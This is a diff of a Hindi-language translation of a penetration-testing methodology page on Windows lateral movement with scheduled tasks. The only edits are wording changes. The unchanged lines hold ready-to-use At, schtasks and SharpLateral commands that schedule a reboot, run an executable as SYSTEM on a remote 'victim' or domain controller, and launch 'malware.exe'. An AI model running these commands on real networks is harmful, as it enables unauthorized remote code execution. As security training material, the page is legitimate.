@@ -4,11 +4,11 @@
 
 ## यह कैसे काम करता है
 
-At आपको उन होस्ट में कार्य शेड्यूल करने की अनुमति देता है जहाँ आप उपयोगकर्ता नाम/(पासवर्ड/हैश) जानते हैं। इसलिए, आप इसका उपयोग अन्य होस्ट में कमांड निष्पादित करने और आउटपुट प्राप्त करने के लिए कर सकते हैं।
+At आपको उन होस्ट में कार्य निर्धारित करने की अनुमति देता है जहाँ आप उपयोगकर्ता नाम/(पासवर्ड/हैश) जानते हैं। इसलिए, आप इसका उपयोग अन्य होस्ट में कमांड निष्पादित करने और आउटपुट प्राप्त करने के लिए कर सकते हैं।
 ```
 At \\victim 11:00:00PM shutdown -r
 ```
-schtasks का उपयोग करते हुए, आपको पहले कार्य बनाना होगा और फिर इसे कॉल करना होगा:
+schtasks का उपयोग करते हुए, आपको पहले कार्य बनाना होगा और फिर उसे कॉल करना होगा:
 ```bash
 schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
 schtasks /run /tn <TASK_NAME> /S <VICTIM>
@@ -22,6 +22,6 @@ schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
 ```
-[**सिल्वर टिकट के साथ schtasks के उपयोग के बारे में अधिक जानकारी यहाँ**](../active-directory-methodology/silver-ticket.md#host).
+[**schtasks के साथ सिल्वर टिकट के उपयोग के बारे में अधिक जानकारी यहाँ**](../active-directory-methodology/silver-ticket.md#host).
 
 {{#include ../../banners/hacktricks-training.md}}
